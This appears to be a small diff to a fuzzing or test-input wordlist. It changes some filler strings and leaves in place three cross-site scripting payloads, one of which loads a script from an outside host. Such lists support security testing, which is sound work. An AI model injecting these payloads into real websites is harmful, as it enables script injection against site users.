@@ -1,5 +1,6 @@
-AAAA
-W00TW00T
+WOOT
+A
+0AAAAAAAAAAAAAAAAAA
 <SCRIPT>alert('XSS');</SCRIPT>
 '';!--"<XSS>=&{()}
 <SCRIPT%20SRC=http://ha.ckers.org/xss.js></SCRIPT>
